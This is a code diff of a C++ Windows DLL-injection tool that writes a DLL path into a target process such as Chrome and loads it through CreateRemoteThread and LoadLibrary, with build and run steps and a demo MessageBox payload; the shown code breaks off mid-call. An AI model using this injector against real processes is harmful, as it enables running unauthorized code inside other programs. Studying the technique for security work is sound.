@@ -1,12 +1,26 @@
+// 						DLL INJECTION 
+// Method of injecting payload(dll) using LoadLibrary function 
+/*
+	Admin rights: NOT required
+		
+	Steps:
+		1. cl /LD injectDll.cpp
+		2. cl dllinjection.cpp
+		2. dllInjection.exe injectDll.dll chrome.exe
+
+	Notes:
+		1. DLL Will pop up a MessageBox on injection
+		2. Pop will appear only for the first injection.
+		   (You need to close the process(chrome), open it again and
+		    then inject to see messageBox again )
+*/
 #include <Windows.h>
 #include <iostream>
-// #include <atlconv.h>
 #include <TlHelp32.h>
 #include <tchar.h>
 #include <Winternl.h>
 #include <fstream>
 #include <wchar.h>
-// #include <future>
 
 #define RTN_OK 0
 #define RTN_USAGE 1
@@ -20,7 +34,7 @@ BOOL Dll_Injection(const char* dll_name, const char* processname){
 	cout<<"[i] full path: "<<lpdllpath<<endl;
 
 	/* Snapshot of processes */
-	DWORD processId{};
+	DWORD processId;
 	cout<<"[+] creating process snapshot\n";
 	auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
 	if (snapshot == INVALID_HANDLE_VALUE){
@@ -28,7 +42,7 @@ BOOL Dll_Injection(const char* dll_name, const char* processname){
 		return FALSE;
 	}
 	cout<<"[+] created process snapshot\n\n";
-	PROCESSENTRY32 pe{};
+	PROCESSENTRY32 pe = {};
 	
 	pe.dwSize = sizeof PROCESSENTRY32;
 	BOOL processFound = FALSE;
@@ -66,7 +80,7 @@ BOOL Dll_Injection(const char* dll_name, const char* processname){
 		cout<<"failed to get handle for process: "<<processId<<endl;
 		return FALSE;
 	}
-	cout<<"[+] Obtained handle to victim(host) process"<<endl;
+	cout<<"[+] obtained handle to victim(host) process"<<endl;
 	auto baseAddressInVictimProcess = VirtualAllocEx(
 		victimProcess,				// handle for victim process
 		nullptr,					// let function decide where to allocate
@@ -78,6 +92,7 @@ BOOL Dll_Injection(const char* dll_name, const char* processname){
 		return FALSE;
 	}
 	cout<<"[+] allocated memory in victim(host) process"<<endl;
+	cout<<"[i] starting address: 0x"<<hex<<(DWORD)baseAddressInVictimProcess<<dec<<endl;
 	if(WriteProcessMemory(
 		victimProcess,
 		baseAddressInVictimProcess,
@@ -94,15 +109,18 @@ BOOL Dll_Injection(const char* dll_name, const char* processname){
 		return FALSE;
 	}
 	cout<<"[+] obtained handle to kernel32"<<endl;
-	auto loadLibAddr = GetProcAddress(kernel32, "LoadLibraryW");
+	auto loadLibAddr = GetProcAddress(kernel32, "LoadLibraryA");
 	if(loadLibAddr==NULL){
-		cout<<"[!] unable to find function 'LoadLibraryW'"<<endl;
-		if((loadLibAddr=GetProcAddress(kernel32, "LoadLibraryA"))==NULL){
-			cout<<"[!] failed to find LoadLibraryA as well!"<<endl;
+		cout<<"[!] unable to find function 'LoadLibraryA'"<<endl;
+		if((loadLibAddr=GetProcAddress(kernel32, "LoadLibraryW"))==NULL){
+			cout<<"[!] failed to find LoadLibraryW as well!"<<endl;
 			return FALSE;
 		}
-		cout<<"[+] but LoadLibraryA was found!"<<endl;
+		cout<<"[+] but LoadLibraryW was found!"<<endl;
+		cout<<"[i] address: 0x"<<hex<<loadLibAddr<<dec<<endl;
 	}
+	cout<<"[+] but LoadLibraryA was found!"<<endl;
+	cout<<"[i] address: 0x"<<hex<<loadLibAddr<<dec<<endl;
 	auto remoteThreadId = CreateRemoteThread(
 		victimProcess,
 		nullptr,
